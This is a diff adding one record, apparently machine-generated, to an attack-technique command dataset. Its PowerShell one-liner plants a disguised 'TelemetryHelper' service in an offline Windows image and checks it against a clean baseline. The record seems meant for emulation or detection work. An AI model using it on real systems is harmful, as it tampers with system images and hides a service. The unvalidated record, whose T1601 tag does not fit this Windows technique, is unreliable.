@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Image /ImageFile:C:\\images\\install_clean.wim /Index:1 /MountDir:C:\\Mount\\Base; dism /Mount-Image /ImageFile:C:\\images\\install_mod.wim /Index:1 /MountDir:C:\\Mount\\Win; reg load HKLM\\BASESYS C:\\Mount\\Base\\Windows\\System32\\Config\\SYSTEM >$null; reg load HKLM\\OFFSYS C:\\Mount\\Win\\Windows\\System32\\Config\\SYSTEM >$null; New-Item -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSYS\\ControlSet001\\Services\\TelemetryHelper\" -Force | Out-Null; New-ItemProperty -Path \"Registry::HKEY_LOCAL_MACHINE\\OFFSYS\\ControlSet001\\Services\\TelemetryHelper\" -Name \"ImagePath\" -Value \"\\SystemRoot\\System32\\svchost.exe -k netsvcs -s TelemetryHelper\" -PropertyType ExpandString -Force | Out-Null; $b=(Get-ChildItem \"Registry::HKEY_LOCAL_MACHINE\\BASESYS\\ControlSet001\\Services\" | ForEach-Object {Split-Path $_.Name -Leaf}); $m=(Get-ChildItem \"Registry::HKEY_LOCAL_MACHINE\\OFFSYS\\ControlSet001\\Services\" | ForEach-Object {Split-Path $_.Name -Leaf}); Compare-Object $b $m",
+  "explanation": "Creates a new service entry in the offline SYSTEM hive of the image and compares the list of services with the clean baseline to validate the injected service.",
+  "rationale_steps": [
+    "Mount images and load SYSTEM hives (Admin).",
+    "Create a new service in the modified image's registry.",
+    "Enumerate and Compare-Object the service names between baseline and modified."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-f5c24626-7e94b93b",
+  "source_prompt_hash": "f5c24626",
+  "timestamp_utc": "2025-09-30T04:51:19.633456Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
